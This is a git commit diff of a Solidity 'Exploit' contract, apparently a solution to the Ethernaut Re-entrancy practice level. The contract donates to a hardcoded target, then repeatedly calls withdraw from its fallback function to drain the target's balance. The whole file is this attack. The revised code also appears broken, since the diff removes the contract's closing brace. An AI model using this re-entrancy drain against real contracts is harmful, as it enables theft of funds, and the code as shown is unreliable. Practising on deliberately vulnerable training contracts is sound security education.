53988cf4ac2cc959c5b0c8b6f4831ad291cc649e
peternderitu <31569127+peternderitu@users.noreply.github.com>
2020-06-29 18:23:28 +0300

    Update reentrancy.sol

--- ethernaut practice/Re-entrancy/reentrancy.sol
+++ ethernaut practice/Re-entrancy/reentrancy.sol
@@ -1,14 +1,16 @@
 contract Exploit {
-    address payable target = 0xF4EF338158A782342863cFe7a003b6277a1106F5;
-    Reentrance c;
-   constructor () public{
-       c = Reentrance(target);  
-       c.donate{value:0.1 ether}(address(this));
+    constructor () public payable{}
+    address payable instance;
+    
+    Reentrance public target = Reentrance(0xA356b9639D931CCCd10908b9BD87a365B96d4174);
+    uint256 public amount = 1 ether;
+   
+    function donateToSelf() public payable {
+        target.donate.value(amount)(address(this));
     }
    
     fallback() external payable {
         if(address(target).balance !=0) {
-        c.withdraw(0.1 ether);
+        target.withdraw(amount);
         }
     }
-}
